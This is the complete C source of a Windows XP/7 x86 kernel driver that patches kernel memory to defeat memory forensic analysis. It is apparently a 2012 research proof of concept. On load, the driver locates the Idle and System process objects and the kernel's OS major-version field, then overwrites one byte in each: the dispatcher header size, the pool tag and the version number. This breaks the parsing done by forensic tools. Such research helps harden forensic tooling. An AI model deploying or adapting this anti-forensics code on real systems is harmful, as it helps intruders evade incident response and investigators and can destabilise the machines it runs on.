/* 
   amf_7x86.c - kernel module for anti memory forensic analysis
   Copyright (c) 2012 Takahiro Haruyama
*/

#include "ntddk.h"
#include "stdio.h"
#include "stdlib.h"

typedef BOOLEAN BOOL;
typedef unsigned long DWORD;
typedef DWORD * PDWORD;
typedef unsigned long ULONG;
typedef unsigned short WORD;
typedef unsigned char BYTE;

const WCHAR deviceLinkBuffer[]  = L"\\DosDevices\\amf";
const WCHAR deviceNameBuffer[]  = L"\\Device\\amf";

#define FILE_DEVICE_AMF                  0x0000584f
#define POOL_HEADER_SIZE                 0x8
#define POOLTAG_OFFSET                   0x4
#define OBJECT_HEADER_SIZE               0x20
#define OBJECT_HEADER_BODY               0x18
#define DISPATCHER_HEADER_SIZE_OFFSET    0x2

PDEVICE_OBJECT g_AMFDevice;

VOID NTAPI KeAttachProcess(IN PEPROCESS);
VOID NTAPI KeDetachProcess();
NTSTATUS NTAPI PsLookupProcessByProcessId(DWORD pid, PEPROCESS *eproc);

PEPROCESS GetIdleProcess()
{
  PEPROCESS IdleProcess;

  _asm {
    mov eax,fs:[0x20] // _KPCR->Prcb
      mov eax,[eax + 0xC] // _KPRCB->IdleThread
      //mov eax,[eax + 0x44]// _KTHREAD->ApcState.Process
      mov eax,[eax + 0x150]// _KTHREAD->Process
      mov IdleProcess,eax
      }

  return IdleProcess;
}

void * GetNtMajorVersion()
{
  void * ptrNtMajorVersion;
  
  KeSetSystemAffinityThread(1); // select 1st processor
  _asm {
    mov eax, fs:[0x1C]  // SelfPCR
      mov eax, [eax + 0x34] // _KPCR->KdVersionBlock
      mov eax, [eax + 0x10] // _DBGKD_GET_VERSION64->KernBase
      add eax, 0x2B8 // PE.MajorOperatingSystemVersion
      mov ptrNtMajorVersion, eax
      }
  KeRevertToUserAffinityThread();
  
  return ptrNtMajorVersion;
}

void PatchDispatcherHeaderSize(PEPROCESS ep) 
{
  DWORD dispatch_size_addr;

  dispatch_size_addr = (DWORD)ep + DISPATCHER_HEADER_SIZE_OFFSET;
  DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, 
	     "Patching one byte to Size in _DISPATCHER_HEADER at 0x%08x\n", dispatch_size_addr);
  memset((void *)dispatch_size_addr, 0, 1);
}

void PatchPoolTag(PEPROCESS ep)
{  
  DWORD pooltag_addr;

  pooltag_addr = (DWORD)ep - OBJECT_HEADER_BODY - POOL_HEADER_SIZE + POOLTAG_OFFSET;
  DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, 
	     "Patching one byte to PoolTag at 0x%08x\n", pooltag_addr);
  memset((void *)pooltag_addr, 0, 1);
}

void PatchKernel(void * ptrNtMajorVersion)
{
  memset(ptrNtMajorVersion, 0, 1);
}

NTSTATUS AMFAddDevice(
		      IN PDRIVER_OBJECT DriverObject
		      )
{
  UNICODE_STRING          deviceNameUnicodeString;
  UNICODE_STRING          deviceLinkUnicodeString; 
  NTSTATUS                ntStatus;
  PEPROCESS ep_idle, ep_system;
  void * ptrNtMajorVersion;

  RtlInitUnicodeString(&deviceNameUnicodeString, deviceNameBuffer);
  RtlInitUnicodeString(&deviceLinkUnicodeString, deviceLinkBuffer);

  ntStatus = IoCreateDevice(DriverObject, 0, &deviceNameUnicodeString,
                            FILE_DEVICE_AMF, 0, TRUE, &g_AMFDevice);
  if(! NT_SUCCESS(ntStatus)) {
      DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, 
		 "Failed to create device!\n");
      return ntStatus;
  }
		
  ntStatus = IoCreateSymbolicLink(&deviceLinkUnicodeString, &deviceNameUnicodeString);
  if(!NT_SUCCESS(ntStatus)) {
      IoDeleteDevice(DriverObject->DeviceObject);
      DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, 
		 "Failed to create symbolic link!\n");
      return ntStatus;
  }

  DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "AMF driver is loaded\n");
  ep_idle = GetIdleProcess();
  DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, 
	     "Idle Process = 0x%08x\n", ep_idle);
  ep_system = PsInitialSystemProcess;
  DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, 
	     "System Process = 0x%08x\n", ep_system);
  ptrNtMajorVersion = GetNtMajorVersion();
  DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, 
	     "pointer to OS Major Version = 0x%08x\n", ptrNtMajorVersion);

  PatchDispatcherHeaderSize(ep_idle);
  PatchPoolTag(ep_system);
  PatchKernel(ptrNtMajorVersion);
  
  return STATUS_SUCCESS;
}

NTSTATUS AMFUnload(
		   IN PDRIVER_OBJECT DriverObject
		   )
{
  UNICODE_STRING          deviceLinkUnicodeString;
  PDEVICE_OBJECT			p_NextObj;

  p_NextObj = DriverObject->DeviceObject;
  if (p_NextObj != NULL) {
      RtlInitUnicodeString(&deviceLinkUnicodeString, deviceLinkBuffer);
      IoDeleteSymbolicLink(&deviceLinkUnicodeString);
      IoDeleteDevice(DriverObject->DeviceObject);
      return STATUS_SUCCESS;
  }  

  DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "AMF driver is unloaded\n");
  return STATUS_SUCCESS;
}

NTSTATUS 
dummy_func(
	   IN PDEVICE_OBJECT DeviceObject, 
	   IN PIRP Irp 
	   )
{
  NTSTATUS				ntstatus;
  ntstatus = Irp->IoStatus.Status = STATUS_SUCCESS;
  IoCompleteRequest( Irp, IO_NO_INCREMENT );
  return ntstatus;   
}

NTSTATUS DriverEntry(
                     IN PDRIVER_OBJECT  DriverObject,
                     IN PUNICODE_STRING RegistryPath 
		     )
{
  NTSTATUS                ntStatus;

  //DbgBreakPoint();  
  AMFAddDevice(DriverObject);

  // if IRP_MJ_CREATE not defined, CreateFile will fail.
  DriverObject->MajorFunction[IRP_MJ_CREATE]          = dummy_func;
  DriverObject->DriverUnload = AMFUnload;

  return STATUS_SUCCESS;
}
